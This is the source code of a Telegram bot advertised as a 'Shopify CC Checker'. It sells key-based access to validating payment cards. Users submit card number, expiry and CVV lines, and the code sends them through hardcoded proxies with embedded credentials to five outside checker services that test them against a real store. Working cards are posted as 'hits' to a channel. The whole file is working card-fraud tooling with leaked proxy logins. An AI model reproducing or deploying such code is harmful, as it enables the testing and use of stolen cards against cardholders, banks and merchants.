import os
import logging
import uuid
import time
import json
import random
import httpx
import asyncio
from telegram import Update
from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, MessageHandler, filters
from urllib.parse import quote
from http.server import HTTPServer, BaseHTTPRequestHandler
import threading

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

class SimpleHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Bot is alive and running!")

def run_server():
    port = int(os.environ.get("PORT", 10000))
    server = HTTPServer(("0.0.0.0", port), SimpleHandler)
    server.serve_forever()

# 🚀 Self-Ping function to prevent Render/Railway from sleeping
def keep_alive_ping():
    railway_url = os.environ.get("RAILWAY_STATIC_URL") or os.environ.get("RENDER_EXTERNAL_URL")
    if not railway_url:
        return
    if not railway_url.startswith("http"):
        railway_url = f"https://{railway_url}"
        
    while True:
        try:
            with httpx.Client(timeout=10.0) as client:
                client.get(railway_url)
                logger.info("Self-ping sent to keep bot alive!")
        except Exception as e:
            logger.error(f"Self-ping failed: {e}")
        time.sleep(240)

TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
OWNER_USERNAME = "@ESCROW2929"
AUTHORIZED_ADMINS = {8785590284}
HIT_CHANNEL_ID = -1000000000000  # ⚠️ Apna Telegram Channel ID yahan daal dein
DATA_FILE = "users_data.json"
BOT_IS_STOPPED = False

PROXY_LIST = [
    "reseller3270s320237:7Grp9Gki@px052001.pointtoserver.com:10780",
    "reseller3270s320237:7Grp9Gki@px051003.pointtoserver.com:10780",
    "reseller3270s320237:7Grp9Gki@px043006.pointtoserver.com:10780",
    "reseller3270s320237:7Grp9Gki@px410701.pointtoserver.com:10780",
    "reseller3270s320237:7Grp9Gki@px015601.pointtoserver.com:10780",
    "reseller3270s320237:7Grp9Gki@px490701.pointtoserver.com:10780",
    "reseller3270s320237:7Grp9Gki@px591801.pointtoserver.com:10780",
    "reseller3270s320237:7Grp9Gki@px022409.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px022505.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px022507.pointtoserver.com:10780",
    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@ca-tor.pvdata.host:8080",
    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@im-bal.pvdata.host:8080",
    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@au-syd.pvdata.host:8080",
    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@jp-tok.pvdata.host:8080",
    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@sg-sin.pvdata.host:8080",
    "px014236.pointtoserver.com:10780:purevpn0s11127688:4mwmyaoa"
]

def load_data():
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, "r") as f:
                data = json.load(f)
                return (
                    set(data.get("all_users", [])),
                    set(data.get("banned_users", [])),
                    set(data.get("sub_admins", [])),
                    data.get("active_keys", {}),
                    {int(k): v for k, v in data.get("user_subscriptions", {}).items()}
                )
        except Exception:
            pass
    return set(), set(), set(), {}, {}

def save_data():
    data = {
        "all_users": list(ALL_USERS),
        "banned_users": list(BANNED_USERS),
        "sub_admins": list(SUB_ADMINS),
        "active_keys": ACTIVE_KEYS,
        "user_subscriptions": USER_SUBSCRIPTIONS
    }
    try:
        with open(DATA_FILE, "w") as f:
            json.dump(data, f, indent=4)
    except Exception:
        pass

ALL_USERS, BANNED_USERS, SUB_ADMINS, ACTIVE_KEYS, USER_SUBSCRIPTIONS = load_data()

def is_main_admin(user_id):
    return user_id in AUTHORIZED_ADMINS

def is_any_admin(user_id):
    return user_id in AUTHORIZED_ADMINS or user_id in SUB_ADMINS

def parse_time_to_seconds(time_str):
    time_str = time_str.lower().strip()
    try:
        if 'd' in time_str:
            return int(time_str.replace('d', '')) * 86400
        elif 'h' in time_str:
            return int(time_str.replace('h', '').strip()) * 3600
        elif 'm' in time_str:
            return int(time_str.replace('m', '').strip()) * 60
    except ValueError:
        pass
    return 86400

async def check_bot_status(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    global BOT_IS_STOPPED
    if BOT_IS_STOPPED and not is_main_admin(update.effective_user.id):
        await update.message.reply_text("⛔ **Bot is currently offline by Owner!**")
        return False
    return True

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_bot_status(update, context):
        return
    user = update.effective_user
    if user.id in BANNED_USERS:
        return
    ALL_USERS.add(user.id)
    save_data()
    
    welcome_text = (
        f"Hello {user.first_name}!\n\n"
        f"🤖 Shopify CC Checker Bot is Online (5-API Active)\n"
        f"⚠️ Use /redeem <key> to activate access.\n"
        f"👑 Owner: {OWNER_USERNAME}"
    )
    await update.message.reply_text(welcome_text)

async def stop_bot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if is_any_admin(update.effective_user.id):
        global BOT_IS_STOPPED
        BOT_IS_STOPPED = True
        await update.message.reply_text("🛑 Bot Stopped.")

async def start_all_bot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if is_any_admin(update.effective_user.id):
        global BOT_IS_STOPPED
        BOT_IS_STOPPED = False
        await update.message.reply_text("🟢 Bot Started.")

async def admin_pannel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if is_any_admin(update.effective_user.id):
        await update.message.reply_text(f"🛠 **Admin Panel**\nUsers: {len(ALL_USERS)}\nBanned: {len(BANNED_USERS)}\nKeys: {len(ACTIVE_KEYS)}")

async def make_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if is_main_admin(update.effective_user.id) and context.args:
        SUB_ADMINS.add(int(context.args[0]))
        save_data()
        await update.message.reply_text("✅ Sub-Admin added.")

async def remove_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if is_main_admin(update.effective_user.id) and context.args:
        SUB_ADMINS.discard(int(context.args[0]))
        save_data()
        await update.message.reply_text("✅ Sub-Admin removed.")

async def ban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if is_any_admin(update.effective_user.id) and context.args:
        b_id = int(context.args[0])
        BANNED_USERS.add(b_id)
        USER_SUBSCRIPTIONS.pop(b_id, None)
        save_data()
        await update.message.reply_text(f"🔨 User {b_id} banned.")

async def unban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if is_any_admin(update.effective_user.id) and context.args:
        u_id = int(context.args[0])
        BANNED_USERS.discard(u_id)
        save_data()
        await update.message.reply_text(f"🔓 User {u_id} unbanned.")

async def generate_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_any_admin(update.effective_user.id) or len(context.args) < 2:
        return
    qty = int(context.args[0])
    dur = parse_time_to_seconds(context.args[1])
    keys = []
    for _ in range(qty):
        k = f"PRIME-{uuid.uuid4().hex[:8].upper()}"
        ACTIVE_KEYS[k] = {"duration_seconds": dur, "used_by": None, "expiry_time": None}
        keys.append(k)
    save_data()
    await update.message.reply_text("🔑 Generated:\n" + "\n".join([f"`{x}`" for x in keys]), parse_mode="Markdown")

# 🕒 Helper to format remaining seconds into readable time (Days/Hours/Minutes)
def format_remaining_time(expiry_timestamp):
    if not expiry_timestamp:
        return "Unused"
    diff = int(expiry_timestamp - time.time())
    if diff <= 0:
        return "Expired"
    
    days = diff // 86400
    hours = (diff % 86400) // 3600
    minutes = (diff % 3600) // 60
    
    parts = []
    if days > 0:
        parts.append(f"{days}d")
    if hours > 0:
        parts.append(f"{hours}h")
    if minutes > 0 or not parts:
        parts.append(f"{minutes}m")
    return " ".join(parts) + " left"

async def list_active_keys(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_any_admin(update.effective_user.id):
        return
    
    if not ACTIVE_KEYS:
        await update.message.reply_text("No keys found.")
        return

    msg_lines = ["🔑 **Keys Status List:**\n"]
    for k, v in ACTIVE_KEYS.items():
        if v['used_by']:
            rem_time = format_remaining_time(v.get('expiry_time'))
            msg_lines.append(f"`{k}` ➔ Used by `{v['used_by']}` ({rem_time})")
        else:
            msg_lines.append(f"`{k}` ➔ Unused")
            
    final_msg = "\n".join(msg_lines)
    await update.message.reply_text(final_msg[:4000], parse_mode="Markdown")

async def key_reset_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if is_any_admin(update.effective_user.id):
        ACTIVE_KEYS.clear()
        USER_SUBSCRIPTIONS.clear()
        save_data()
        await update.message.reply_text("✅ Reset done.")

async def redeem_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user.id in BANNED_USERS or not context.args:
        return
    k = context.args[0].upper()
    if k not in ACTIVE_KEYS or ACTIVE_KEYS[k]["used_by"] is not None:
        await update.message.reply_text("❌ Invalid/Used Key.")
        return
    
    ACTIVE_KEYS[k]["used_by"] = user.id
    ACTIVE_KEYS[k]["expiry_time"] = time.time() + ACTIVE_KEYS[k]["duration_seconds"]
    USER_SUBSCRIPTIONS[user.id] = ACTIVE_KEYS[k]["expiry_time"]
    save_data()
    
    await update.message.reply_text("✅ Sub Active!")
    
    username_str = f"@{user.username}" if user.username else "No Username"
    admin_notification = (
        f"🔔 **New Key Redeemed!**\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"👤 **Name:** {user.first_name}\n"
        f"🔗 **Username:** {username_str}\n"
        f"🆔 **User ID:** `{user.id}`\n"
        f"🔑 **Key:** `{k}`\n"
        f"━━━━━━━━━━━━━━━━━━"
    )
    
    all_admin_ids = AUTHORIZED_ADMINS.union(SUB_ADMINS)
    for admin_id in all_admin_ids:
        try:
            await context.bot.send_message(chat_id=admin_id, text=admin_notification, parse_mode="Markdown")
        except Exception:
            pass

def has_access(user_id):
    if is_any_admin(user_id):
        return True
    if user_id in USER_SUBSCRIPTIONS:
        if time.time() < USER_SUBSCRIPTIONS[user_id]:
            return True
        del USER_SUBSCRIPTIONS[user_id]
        save_data()
    return False

async def get_bin_info(bin_code):
    try:
        async with httpx.AsyncClient(timeout=4.0) as client:
            res = await client.get(f"https://lookup.binlist.net/{bin_code}")
            if res.status_code == 200:
                d = res.json()
                return f"{d.get('scheme','?').upper()} - {d.get('type','?').upper()}", d.get("bank", {}).get("name", "?").upper(), d.get("country", {}).get("name", "?").upper()
    except Exception:
        pass
    return "UNKNOWN", "UNKNOWN", "UNKNOWN"

async def fetch_api(client, url):
    try:
        response = await client.get(url)
        if response.status_code == 200:
            data = response.json()
            if data and isinstance(data, dict):
                return data
    except Exception:
        pass
    return None

async def process_card_string(card_line, user, context):
    try:
        parts = card_line.split('|')
        if len(parts) < 4:
            return f"❌ {card_line} ➔ Invalid Format"
        
        cc, mes, ano, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
        formatted_cc = f"{cc}|{mes}|{ano}|{cvv}"
        bin_info, bank_info, country_info = await get_bin_info(cc[:6])
        
        site_url = "https://artpop.com"
        selected_proxies = random.sample(PROXY_LIST, min(5, len(PROXY_LIST)))
        
        res_data = None
        async with httpx.AsyncClient(timeout=25.0, follow_redirects=True) as client:
            url_1 = f"http://rhaenyra.xyz/shopify?cc={quote(formatted_cc)}&url={quote(site_url)}&proxy={quote(selected_proxies[0])}"
            url_2 = f"https://web-production-c2d03.up.railway.app/shopify?site={quote(site_url)}&cc={quote(formatted_cc)}&proxy={quote(selected_proxies[1])}"
            url_3 = f"http://216.250.119.63/?cc={quote(formatted_cc)}&url={quote(site_url)}&proxy={quote(selected_proxies[2])}"
            url_4 = f"https://shopix.up.railway.app/shopii?cc={quote(formatted_cc)}&site={quote(site_url)}&proxy={quote(selected_proxies[3])}"
            url_5 = f"http://shopii-api-production.up.railway.app/shopify?site={quote(site_url)}&cc={quote(formatted_cc)}&proxy={quote(selected_proxies[4])}"
            
            tasks = [
                fetch_api(client, url_1),
                fetch_api(client, url_2),
                fetch_api(client, url_3),
                fetch_api(client, url_4),
                fetch_api(client, url_5)
            ]
            
            completed = await asyncio.gather(*tasks)
            for res in completed:
                if res and isinstance(res, dict):
                    if "Response" in res or "Approved" in res or "Charged" in res:
                        res_data = res
                        break

        if not res_data:
            return f"❌ {card_line} ➔ All 5 APIs & Proxies failed/timed out."
        
        resp_status = res_data.get("Response", "UNKNOWN")
        price = res_data.get("Price", "$14.97")
        gate = res_data.get("Gate", "Shopify Payments")
        approved = str(res_data.get("Approved", "False"))
        charged = str(res_data.get("Charged", "False"))
        
        is_success = (approved.lower() == "true" or charged.lower() == "true" or "approved" in resp_status.lower() or "success" in resp_status.lower())
        hit_title = "⚡💠 𝐇𝐢𝐭 𝐅𝐨𝐮𝐧𝐝!" if is_success else "❌💠 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝!"
        
        masked_cc = f"{cc[:6]}******{cc[-4:]}|{mes}|{ano}|{cvv}" if len(cc) >= 10 else "******"
        
        if is_success:
            username_str = f"@{user.username}" if user.username else "No Username"
            channel_msg = (
                f"⚡💳  # NEW HIT FOUND  💳⚡\n"
                f"━━━━━━━━━━━━━━━━━\n"
                f"⚠️ Status: {resp_status}\n"
                f"💳 Card: `{masked_cc}`\n"
                f"🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {gate} | 💰 {price}\n"
                f"━━━━━━━━━━━━━━━━━\n"
                f"𝗕𝗜𝗡: {bin_info} | 𝗕𝗮𝗻𝗸: {bank_info}\n"
                f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country_info}\n"
                f"━━━━━━━━━━━━━━━━━\n"
                f"👤 **Checked By:** {user.first_name}\n"
                f"🔗 **Username:** {username_str}\n"
                f"🆔 **User ID:** `{user.id}`"
            )
            try:
                await context.bot.send_message(chat_id=HIT_CHANNEL_ID, text=channel_msg, parse_mode="Markdown")
            except Exception:
                pass

        return (
            f"⚡💳  # PRIME CHECKER  💳⚡\n"
            f"━━━━━━━━━━━━━━━━━\n"
            f"{hit_title}\n"
            f"⚠️ Status: {resp_status}\n"
            f"💳 Card: {formatted_cc}\n"
            f"🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {gate} | 💰 {price}\n"
            f"━━━━━━━━━━━━━━━━━\n"
            f"𝗕𝗜𝗡: {bin_info} | 𝗕𝗮𝗻𝗸: {bank_info}\n"
            f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country_info}\n"
            f"━━━━━━━━━━━━━━━━━\n"
            f"👤 Checked By ➠ {user.first_name}"
        )
    except Exception:
        return f"❌ {card_line} ➔ Error occurred."

card_semaphore = asyncio.Semaphore(5)

async def safe_process_card(card_line, user, context):
    async with card_semaphore:
        return await process_card_string(card_line, user, context)

async def chk_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_bot_status(update, context):
        return
    user_id = update.effective_user.id
    if user_id in BANNED_USERS or not has_access(user_id):
        await update.message.reply_text("⛔ Access Denied! Use `/redeem <key>`.")
        return
    if not context.args:
        return
    msg = await update.message.reply_text("⏳ Processing with 5 APIs & Proxies...")
    result = await process_card_string(" ".join(context.args), update.effective_user, context)
    await context.bot.edit_message_text(chat_id=update.effective_chat.id, message_id=msg.message_id, text=result)

async def chks_cards(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_bot_status(update, context):
        return
    user_id = update.effective_user.id
    if user_id in BANNED_USERS or not has_access(user_id):
        await update.message.reply_text("⛔ Access Denied! Use `/redeem <key>`.")
        return
    
    cards_text = update.message.text.replace("/chks", "").strip()
    if not cards_text:
        return
    card_lines = [l.strip() for l in cards_text.split("\n") if l.strip() and "|" in l][:10]
    if not card_lines:
        return

    status_msg = await update.message.reply_text(f"⏳ Processing {len(card_lines)} cards across 5 APIs...")
    tasks = [safe_process_card(line, update.effective_user, context) for line in card_lines]
    results = await asyncio.gather(*tasks)
    
    final_output = "\n\n".join(results)[:4000]
    try:
        await context.bot.edit_message_text(chat_id=update.effective_chat.id, message_id=status_msg.message_id, text=final_output)
    except Exception:
        await update.message.reply_text(final_output)

async def chf_file_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_bot_status(update, context):
        return
    user_id = update.effective_user.id
    if user_id in BANNED_USERS or not has_access(user_id):
        await update.message.reply_text("⛔ Access Denied! Use `/redeem <key>`.")
        return
    document = update.message.document
    if not document:
        return
    
    status_msg = await update.message.reply_text("⏳ Processing file via 5 APIs...")
    try:
        file = await context.bot.get_file(document.file_id)
        file_bytes = await file.download_as_bytearray()
        card_lines = [l.strip() for l in file_bytes.decode("utf-8", errors="ignore").split("\n") if l.strip() and "|" in l][:10]
        
        tasks = [safe_process_card(line, update.effective_user, context) for line in card_lines]
        results = await asyncio.gather(*tasks)
        
        final_output = "\n\n".join(results)[:4000]
        await context.bot.send_message(chat_id=update.effective_chat.id, text=final_output)
    except Exception:
        pass

def main():
    if not TOKEN:
        return
    
    threading.Thread(target=run_server, daemon=True).start()
    threading.Thread(target=keep_alive_ping, daemon=True).start()
    
    app = ApplicationBuilder().token(TOKEN).concurrent_updates(True).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stop", stop_bot))
    app.add_handler(CommandHandler("startall", start_all_bot))
    app.add_handler(CommandHandler("admin", admin_pannel))
    app.add_handler(CommandHandler("adminpannel", admin_pannel))
    app.add_handler(CommandHandler("makeadmin", make_admin))
    app.add_handler(CommandHandler("removeadmin", remove_admin))
    app.add_handler(CommandHandler("ban", ban_user))
    app.add_handler(CommandHandler("unban", unban_user))
    app.add_handler(CommandHandler("key", generate_key))
    app.add_handler(CommandHandler("listkeys", list_active_keys))
    app.add_handler(CommandHandler("keyreset", key_reset_command))
    app.add_handler(CommandHandler("redeem", redeem_key))
    app.add_handler(CommandHandler("chk", chk_card))
    app.add_handler(CommandHandler("chks", chks_cards))
    app.add_handler(CommandHandler("chf", chf_file_check))
    app.add_handler(MessageHandler(filters.Document.ALL, chf_file_check))
    
    while True:
        try:
            logger.info("Starting bot polling...")
            app.run_polling(drop_pending_updates=True)
        except Exception as e:
            logger.error(f"Polling crashed: {e}, restarting in 5 seconds...")
            time.sleep(5)

if __name__ == "__main__":
    main()
